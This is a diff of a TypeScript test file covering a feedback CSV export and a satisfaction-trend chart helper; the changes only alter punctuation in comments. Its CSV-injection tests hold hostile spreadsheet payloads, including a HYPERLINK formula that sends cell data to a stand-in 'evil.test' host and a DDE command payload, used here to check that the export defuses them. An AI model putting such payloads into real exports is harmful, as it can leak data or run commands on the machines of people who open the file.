@@ -2,8 +2,8 @@
  * The two feedback helpers a customer reads conclusions off: the CSV export and
  * the satisfaction trend.
  *
- * Question and Answer are raw chat content — whatever a website visitor typed,
- * verbatim — so the export is the second place (after the lead exports) where
+ * Question and Answer are raw chat content (whatever a website visitor typed,
+ * verbatim) so the export is the second place (after the lead exports) where
  * untrusted text leaves the product as a file the customer opens in Excel. The
  * escape itself is unit-tested in `lib/csvSafe.test.ts`; these prove it is
  * wired into the file that actually gets downloaded, and pin the two data-
@@ -56,7 +56,7 @@ describe('buildFeedbackCsv', () => {
   });
 });
 
-describe('buildFeedbackCsv — CSV injection', () => {
+describe('buildFeedbackCsv. CSV injection', () => {
   it.each([
     ['=HYPERLINK("https://evil.test/?"&A1,"Click")', 'formula'],
     ['+cmd|" /C calc"!A0', 'signed expression / DDE'],
@@ -71,7 +71,7 @@ describe('buildFeedbackCsv — CSV injection', () => {
     const question = cells(csv, 1)[3];
     expect(question).toBe(`'${payload}`);
     expect(TRIGGERS.some((t) => question.startsWith(t))).toBe(false);
-    // Defused, not dropped — the question stays readable.
+    // Defused, not dropped, the question stays readable.
     expect(question.slice(1)).toBe(payload);
   });
 
@@ -101,7 +101,7 @@ describe('buildFeedbackCsv — CSV injection', () => {
   });
 
   it('leaves ordinary content alone', () => {
-    /* No stray quotes on real data — the escape is targeted at the leading
+    /* No stray quotes on real data, the escape is targeted at the leading
        character and nothing else. */
     const csv = buildFeedbackCsv([item()]);
     const row = cells(csv, 1);
@@ -112,11 +112,11 @@ describe('buildFeedbackCsv — CSV injection', () => {
   });
 });
 
-describe('buildFeedbackCsv — data integrity', () => {
+describe('buildFeedbackCsv. Data integrity', () => {
   it('keeps commas in the data instead of deleting them', () => {
     /* Regression: the previous implementation ran `.replace(/,/g, '')` over
        user, question and answer before quoting them. Quoting is what makes a
-       comma safe; stripping it silently corrupted the export — and this is a
+       comma safe; stripping it silently corrupted the export, and this is a
        one-way door, since the CSV is where the data leaves the product. */
     const csv = buildFeedbackCsv([
       item({
@@ -128,13 +128,13 @@ describe('buildFeedbackCsv — data integrity', () => {
     const row = cells(csv, 1);
     expect(row[3]).toBe('Do you support Hindi, Marathi, and Tamil?');
     expect(row[4]).toBe('Yes, all three.');
-    // Still parses as 5 fields — the commas are inside quoted cells.
+    // Still parses as 5 fields, the commas are inside quoted cells.
     expect(row).toHaveLength(5);
   });
 
   it('doubles embedded quotes in every column, including User', () => {
     /* Regression: `user` was comma-stripped but never quote-escaped, unlike
-       the other columns — a quote in it broke the row apart for the parser. */
+       the other columns, a quote in it broke the row apart for the parser. */
     const csv = buildFeedbackCsv([
       item({ user: 'User "3"', question: 'What is "RAG"?', answer: 'Retrieval-"augmented".' }),
     ]);
@@ -153,8 +153,8 @@ describe('buildFeedbackCsv — data integrity', () => {
  * Every assertion below names the actual days, because the failure mode here is
  * one that counting points cannot see. `/analytics/feedback` returns rows
  * newest-first (`sorted(…, reverse=True)` in `get_feedback_endpoint`), while
- * Recharts plots an array left-to-right, so the chart wants the opposite order —
- * oldest first — capped to the *most recent* 14 days. A cap that kept the wrong
+ * Recharts plots an array left-to-right, so the chart wants the opposite order
+ * (oldest first) capped to the *most recent* 14 days. A cap that kept the wrong
  * end still returns 14 points and still renders a plausible-looking line; it
  * just shows a fortnight from weeks ago under a heading that says "trend". That
  * is worse than a blank chart, because nothing about it looks wrong, so the
@@ -175,7 +175,7 @@ describe('buildTrend', () => {
   }
 
   /**
-   * Twenty consecutive days, newest first — the order the endpoint returns.
+   * Twenty consecutive days, newest first, the order the endpoint returns.
    * Only the newest day is positive, so each day's rate identifies it.
    */
   const twentyDays = Array.from({ length: 20 }, (_, index) =>
@@ -185,7 +185,7 @@ describe('buildTrend', () => {
   it('keeps the most recent 14 days, not the oldest 14', () => {
     /* The bug this pins: `.slice(-14)` over newest-first input takes from the
        wrong end, so the chart rendered Jul 1-14 while the customer's latest
-       week — the only part they can still act on — was dropped. */
+       week (the only part they can still act on) was dropped. */
     expect(buildTrend(twentyDays, 0).map((point) => point.date)).toEqual([
       'Jul 7',
       'Jul 8',
@@ -228,8 +228,8 @@ describe('buildTrend', () => {
   it('does not depend on the order the endpoint returned rows in', () => {
     /* The coupling that caused the bug: the helper inferred chronology from
        the caller's sort order. `get_feedback_endpoint` could switch to `ORDER
-       BY created_at` tomorrow — a change with no visible connection to this
-       chart — and the wrong fortnight would silently come back. */
+       BY created_at` tomorrow (a change with no visible connection to this
+       chart) and the wrong fortnight would silently come back. */
     expect(buildTrend([...twentyDays].reverse(), 0)).toEqual(buildTrend(twentyDays, 0));
   });
 
@@ -251,7 +251,7 @@ describe('buildTrend', () => {
   });
 
   it('rounds the daily rate over every rating in the day', () => {
-    /* The arithmetic, on a day that is neither all-positive nor all-negative —
+    /* The arithmetic, on a day that is neither all-positive nor all-negative,
        the single-rating days above exercise only 100 and 0, so a bucket that
        summed wrongly or divided by the wrong denominator would still pass them.
        1 of 3 is 33.33%, which also pins the rounding rather than truncation. */
@@ -259,7 +259,7 @@ describe('buildTrend', () => {
 
     expect(buildTrend(oneOfThree, 0)).toEqual([{ date: 'Jul 5', rate: 33, total: 3 }]);
 
-    // 2 of 3 is 66.67% — rounds up, so the two cases together show it is not
+    // 2 of 3 is 66.67%. Rounds up, so the two cases together show it is not
     // flooring.
     const twoOfThree = [ratedOn(6, 1), ratedOn(6, 1), ratedOn(6, -1)];
     expect(buildTrend(twoOfThree, 0)).toEqual([{ date: 'Jul 6', rate: 67, total: 3 }]);
@@ -268,7 +268,7 @@ describe('buildTrend', () => {
   it('keeps the same calendar day in different years apart', () => {
     /* The label carries no year, so keying buckets on it merged this Jul 21
        with last year's into one averaged point. Reachable from the "All" range
-       on any workspace older than a year — and the merged bucket took the older
+       on any workspace older than a year, and the merged bucket took the older
        timestamp, so it also sorted as ancient and could fall out of the most
        recent 14 entirely. Two real days, two points. */
     const acrossYears = [
